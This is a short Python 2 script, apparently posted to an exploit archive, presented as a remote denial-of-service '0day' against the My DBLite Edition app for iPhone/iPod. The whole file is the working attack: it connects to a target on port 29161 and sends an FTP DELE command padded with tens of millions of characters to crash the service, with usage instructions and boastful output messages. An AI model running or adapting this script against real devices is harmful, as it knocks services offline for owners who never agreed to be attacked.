#!/usr/bin/python
#
# Apple Iphone/Ipod - My DBLite Edition #Remote 0day DOS exploit
# Found by: Jason Bowes - admin @ blue-#dogz.com
# App Homepage: www.xenugo.co 
# Price: Free
# Download: From the app store (use your #itunes account)
# Tested on: Iphone 3GS - firmware 3.1.2 
# What's up to slicc1 
# Advisory: ()




print "[+] Apple Iphone/Ipod - My DB lite edition Remote DOS exploit"

import ftplib

from ftplib import FTP

import sys

import socket



def Usage():

    print ("Usage:  ./mydblite.py <serv_ip>\n")

    print ("Example:./mydblite.py 192.168.1.3\n")

if len(sys.argv) <> 2:

        Usage()

        sys.exit(1)

else:

    hostname = sys.argv[1]

    delete = "$A$A$A" * 10000000

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:

        sock.connect((hostname, 29161))

        print "[+] Connecting to the target.."

    except:

        print ("[-] Connection error!")

        sys.exit(1)

    r=sock.recv(1024)

    print "[+] Sending payload..boom..boom..pow"

    sock.send("DELE %s\r\n" %delete)

print "[+] Server should now be DoS'd!"

sys.exit(0);
